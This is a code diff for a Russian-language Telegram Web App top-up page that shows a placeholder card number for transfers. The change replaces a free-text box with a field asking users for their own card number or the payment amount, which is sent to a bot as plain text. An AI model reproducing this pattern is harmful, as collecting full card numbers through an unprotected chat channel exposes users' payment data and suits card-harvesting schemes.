@@ -6,66 +6,56 @@
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         body { background: #0b0e14; color: white; font-family: sans-serif; padding: 20px; text-align: center; }
-        .card-box { background: #1c212a; border-radius: 15px; padding: 20px; border: 1px solid #5865f2; margin-bottom: 20px; }
-        .card-num { font-size: 18px; color: #ebba4e; font-weight: bold; cursor: pointer; display: block; margin-top: 10px; border-bottom: 1px dashed #ebba4e; padding-bottom: 5px; }
+        .card-info { background: #1c212a; border-radius: 15px; padding: 20px; border: 1px solid #5865f2; margin-bottom: 25px; }
+        .card-num { font-size: 20px; color: #ebba4e; font-weight: bold; display: block; margin-top: 10px; letter-spacing: 1px; }
         
-        /* Поле, куда МОЖНО ПИСАТЬ */
+        /* Поле ввода для ЦИФР */
         input { 
             width: 100%; 
             background: #0d1117; 
             border: 2px solid #30363d; 
             padding: 15px; 
-            border-radius: 10px; 
+            border-radius: 12px; 
             color: white; 
-            font-size: 16px; 
+            font-size: 18px; 
             margin-top: 10px; 
             outline: none; 
             box-sizing: border-box;
+            text-align: center;
         }
         input:focus { border-color: #00c853; }
 
-        .pay-btn { background: #00c853; color: white; border: none; width: 100%; padding: 18px; border-radius: 12px; font-weight: bold; margin-top: 20px; cursor: pointer; font-size: 16px; }
+        .send-btn { background: #00c853; color: white; border: none; width: 100%; padding: 18px; border-radius: 12px; font-weight: bold; margin-top: 25px; cursor: pointer; font-size: 16px; }
+        label { font-size: 14px; color: #8b949e; }
     </style>
 </head>
 <body>
-    <h3>$ Пополнение баланса $</h3>
+    <h3>$ Пополнение $</h3>
     
-    <div class="card-box">
-        <small style="color: #8b949e;">Переведите деньги на карту:</small>
-        <span class="card-num" id="card" onclick="copyNum()">8600 0000 0000 0000</span>
-        <small style="color: #5865f2; font-size: 11px;">(Нажмите на номер, чтобы скопировать его)</small>
+    <div class="card-info">
+        <label>Переведите на эту карту:</label>
+        <span class="card-num">8600 1234 5678 9000</span>
     </div>
 
     <div style="text-align: left;">
-        <label style="font-size: 14px; color: #8b949e; margin-left: 5px;">Что вы хотите написать? (Сумма или данные)</label>
-        <input type="text" id="userInput" placeholder="Напишите здесь...">
+        <label>Введите номер вашей карты или сумму оплаты:</label>
+        <input type="text" id="payInput" inputmode="numeric" pattern="[0-9]*" placeholder="0000 0000 0000 0000">
     </div>
 
-    <button class="pay-btn" onclick="send()">Отправить в бот</button>
+    <button class="send-btn" onclick="sendToBot()">Отправить данные</button>
 
     <script>
         let tg = window.Telegram.WebApp;
         tg.expand();
 
-        // Функция просто копирует номер, чтобы ты не переписывал его вручную
-        function copyNum() {
-            const el = document.createElement('textarea');
-            el.value = '8600000000000000'; // ТВОЙ НОМЕР КАРТЫ
-            document.body.appendChild(el);
-            el.select();
-            document.execCommand('copy');
-            document.body.removeChild(el);
-            alert("Номер карты скопирован! Оплатите в приложении банка и возвращайтесь сюда.");
-        }
-
-        // Функция отправляет твой текст обратно в Telegram бот
-        function send() {
-            let val = document.getElementById('userInput').value;
+        function sendToBot() {
+            let val = document.getElementById('payInput').value;
             if(!val) {
-                alert("Пожалуйста, напишите что-нибудь в поле!");
+                alert("Сначала введите данные!");
                 return;
             }
-            tg.sendData("💰 СООБЩЕНИЕ ОБ ОПЛАТЕ: " + val);
+            // Отправляем текст в твой bot.py
+            tg.sendData("💳 Данные оплаты: " + val);
             tg.close();
         }
     </script>
